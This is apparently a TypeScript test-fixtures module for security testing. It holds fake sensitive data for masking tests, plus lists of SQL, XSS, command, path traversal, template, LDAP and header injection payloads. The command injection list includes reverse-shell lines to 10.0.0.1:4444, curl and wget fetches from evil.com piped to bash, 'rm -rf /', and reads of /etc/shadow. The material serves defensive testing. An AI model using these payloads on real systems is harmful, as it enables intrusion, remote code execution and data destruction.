/**
 * Security Test Fixtures
 *
 * Common fixtures and attack vectors for security testing
 */

// Sensitive data patterns for masking tests
export const sensitiveDataFixtures = {
  passwords: [
    { field: 'password', value: 'secret123' },
    { field: 'Password', value: 'Secret123' },
    { field: 'PASSWORD', value: 'ALLCAPS123' },
    { field: 'passWord', value: 'camelCase123' },
    { field: 'password_confirmation', value: 'confirm123' },
    { field: 'passwordHash', value: 'hashedvalue123' },
    { field: 'user_password', value: 'userpass123' },
    { field: 'currentPassword', value: 'current123' },
    { field: 'newPassword', value: 'newpass123' },
  ],

  tokens: [
    { field: 'token', value: 'jwt-token-value' },
    { field: 'accessToken', value: 'access-token-123' },
    { field: 'refreshToken', value: 'refresh-token-456' },
    { field: 'bearerToken', value: 'Bearer xyz789' },
    { field: 'authToken', value: 'auth-token-abc' },
  ],

  apiKeys: [
    { field: 'apiKey', value: 'ak_live_123456' },
    { field: 'api_key', value: 'ak_test_789' },
    { field: 'API_KEY', value: 'AK_PROD_000' },
    { field: 'x-api-key', value: 'x-api-key-value' },
    { field: 'clientId', value: 'client_id_123' },
    { field: 'clientSecret', value: 'cs_secret_value' },
  ],

  creditCards: [
    { field: 'cardNumber', value: '4111111111111111' },
    { field: 'card_number', value: '5500000000000004' },
    { field: 'creditCardNumber', value: '378282246310005' },
    { field: 'cvv', value: '123' },
    { field: 'cvc', value: '456' },
    { field: 'cardCvv', value: '789' },
  ],

  personalInfo: [
    { field: 'ssn', value: '123-45-6789' },
    { field: 'socialSecurityNumber', value: '987-65-4321' },
    { field: 'email', value: 'user@example.com' },
    { field: 'phone', value: '+1-555-123-4567' },
    { field: 'phoneNumber', value: '5551234567' },
  ],

  headers: [
    { field: 'authorization', value: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' },
    { field: 'Authorization', value: 'Bearer xyz.abc.def' },
    { field: 'cookie', value: 'session=abc123; token=xyz789' },
    { field: 'x-auth-token', value: 'auth-header-token' },
  ],
};

// SQL injection attack vectors
export const sqlInjectionVectors = [
  "' OR '1'='1",
  "1; DROP TABLE users--",
  "' UNION SELECT * FROM users--",
  "'; DELETE FROM users WHERE '1'='1",
  "1 OR 1=1",
  "admin'--",
  "' OR ''='",
  "1' AND '1'='1",
  "SELECT * FROM users WHERE id=1",
  "'; INSERT INTO users VALUES ('hack')--",
  "1; UPDATE users SET password='hacked' WHERE '1'='1",
  "UNION ALL SELECT NULL,NULL,NULL--",
  "' HAVING 1=1--",
  "' GROUP BY columnnames HAVING 1=1--",
  "ORDER BY 1--",
];

// XSS (Cross-Site Scripting) attack vectors
export const xssVectors = [
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(1)">',
  '<svg onload="alert(1)">',
  'javascript:alert(1)',
  '<body onload="alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  '<input onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">',
  '<div style="background:url(javascript:alert(1))">',
  '<iframe src="javascript:alert(1)">',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<img src=x onerror=alert(1)//>',
  '<svg/onload=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
];

// Command injection attack vectors
export const commandInjectionVectors = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(cat /etc/passwd)',
  '&& rm -rf /',
  '|| echo vulnerable',
  '; echo "test" > /tmp/test.txt',
  '| nc -e /bin/sh 10.0.0.1 4444',
  '$(curl http://evil.com/shell.sh | bash)',
  '\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
  '`id`',
  '$(id)',
  '; cat /etc/shadow',
  '| wget http://evil.com/malware',
];

// Path traversal attack vectors
export const pathTraversalVectors = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '/etc/passwd%00.txt',
  '..%c0%af..%c0%af..%c0%afetc/passwd',
  '..%255c..%255c..%255cwindows%255csystem32',
  '/var/www/../../etc/passwd',
  'file:///etc/passwd',
  '....//....//....//....//etc/passwd',
  '..\\..\\..',
  '..././..././..././etc/passwd',
  '/proc/self/environ',
];

// Template injection attack vectors
export const templateInjectionVectors = [
  '{{7*7}}',
  '${7*7}',
  '<%= 7*7 %>',
  '#{7*7}',
  '${{7*7}}',
  '@(7*7)',
  '{{constructor.constructor("return this")()}}',
  '{{this.constructor.constructor("return process")().exit()}}',
  '{%%}',
  '#{system("ls")}',
  '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
];

// LDAP injection vectors
export const ldapInjectionVectors = [
  '*',
  '*)(&',
  '*)(uid=*))(|(uid=*',
  'admin)(&)',
  '*)((|userPassword=*)',
  'x)(|(objectClass=*))',
  '*()|%26',
  '*)(cn=*',
];

// Header injection vectors
export const headerInjectionVectors = [
  'value\r\nX-Injected: header',
  'value\nSet-Cookie: malicious=true',
  'value%0d%0aX-Injected:%20header',
  'value\r\nContent-Length: 0\r\n\r\n',
  'value%0aX-XSS-Protection:%200',
  'value\nHost: evil.com',
];

// Unicode test strings
export const unicodeTestStrings = {
  chinese: '中文测试',
  japanese: '日本語テスト',
  korean: '한국어 테스트',
  arabic: 'اختبار عربي',
  hindi: 'हिंदी परीक्षण',
  russian: 'Русский тест',
  emoji: '🚀🔥💯🎉',
  mixedEmoji: 'Test 🚀 Data 🔥 Here 💯',
  rtl: 'مرحبا بالعالم',
  combined: '中文 日本語 한국어 العربية',
  specialChars: '™®©℗℠',
  mathSymbols: '∑∏∫∂∇',
  currency: '€£¥₹₽₿',
  combining: 'café résumé naïve',
  zeroWidth: 'test\u200bdata\u200c',
  bom: '\ufeffBOM test',
};

// Large payload generators
export const largePayloadGenerators = {
  generateLargeString: (size: number): string => 'x'.repeat(size),

  generateLargeArray: (size: number): any[] =>
    Array.from({ length: size }, (_, i) => ({
      id: i,
      name: `Item ${i}`,
      value: Math.random(),
    })),

  generateDeeplyNested: (depth: number): object => {
    let obj: any = { value: 'deepest' };
    for (let i = 0; i < depth; i++) {
      obj = { [`level${depth - i}`]: obj };
    }
    return obj;
  },

  generateLargeObject: (keys: number): Record<string, any> => {
    const obj: Record<string, any> = {};
    for (let i = 0; i < keys; i++) {
      obj[`key${i}`] = {
        id: i,
        name: `Value ${i}`,
        nested: { data: `data${i}` },
      };
    }
    return obj;
  },
};

// Invalid JSON/YAML test cases
export const malformedDataFixtures = {
  invalidJson: [
    '{missing: quotes}',
    '{"unclosed": "brace"',
    '{key: value,}',
    "{'single': 'quotes'}",
    '{"trailing": "comma",}',
    '{null}',
    '{"nested": {"broken}',
    '[1, 2, 3,]',
    '{"number": 01}',
    '{"unicode": "\\uXXXX"}',
  ],

  invalidYaml: [
    'key: value\n  bad_indent: value',
    '- item1\n -item2',
    'key:: double_colon',
    '  leading_space: value',
    'tab\ttab: value',
    '---\n...\n---invalid',
    'multiline: |\n  no content\n---',
  ],

  edgeCaseValues: [
    null,
    undefined,
    NaN,
    Infinity,
    -Infinity,
    Number.MAX_SAFE_INTEGER,
    Number.MIN_SAFE_INTEGER,
    Number.MAX_VALUE,
    Number.MIN_VALUE,
    '',
    '   ',
    '\t\n\r',
    [],
    {},
  ],
};

// Circular reference helpers
export const circularReferenceHelpers = {
  createCircularObject: (): any => {
    const obj: any = { name: 'circular' };
    obj.self = obj;
    return obj;
  },

  createCircularArray: (): any[] => {
    const arr: any[] = [1, 2, 3];
    arr.push(arr);
    return arr;
  },

  createDeepCircular: (depth: number): any => {
    const root: any = { level: 0 };
    let current = root;
    for (let i = 1; i < depth; i++) {
      current.next = { level: i };
      current = current.next;
    }
    current.circular = root;
    return root;
  },
};

// Mock Express request/response helpers
export const mockHelpers = {
  createMockRequest: (overrides: any = {}) => ({
    method: 'GET',
    path: '/test',
    query: {},
    headers: {},
    body: {},
    params: {},
    ...overrides,
  }),

  createMockResponse: () => {
    const res: any = {
      statusCode: 200,
      headers: {},
      body: null,
      send: function (body: any) {
        this.body = body;
        return this;
      },
      status: function (code: number) {
        this.statusCode = code;
        return this;
      },
      json: function (data: any) {
        this.body = data;
        return this;
      },
      setHeader: function (name: string, value: string) {
        this.headers[name] = value;
        return this;
      },
    };
    return res;
  },

  createMockNext: () => {
    let called = false;
    let error: Error | null = null;
    const fn = (err?: Error) => {
      called = true;
      error = err || null;
    };
    fn.called = () => called;
    fn.error = () => error;
    return fn;
  },
};

// Test assertion helpers
export const assertionHelpers = {
  containsNoSensitiveData: (obj: any, sensitivePatterns: string[]): boolean => {
    const jsonStr = JSON.stringify(obj);
    return !sensitivePatterns.some((pattern) =>
      new RegExp(pattern, 'i').test(jsonStr)
    );
  },

  isProperlyMasked: (value: string, maskChar = '*'): boolean => {
    return value.includes(maskChar) || value.includes('REDACTED');
  },

  hasNoInjectionRisk: (value: string): boolean => {
    const dangerousPatterns = [
      /<script/i,
      /javascript:/i,
      /on\w+=/i,
      /SELECT.*FROM/i,
      /DROP\s+TABLE/i,
      /;.*--/,
    ];
    return !dangerousPatterns.some((pattern) => pattern.test(value));
  },
};
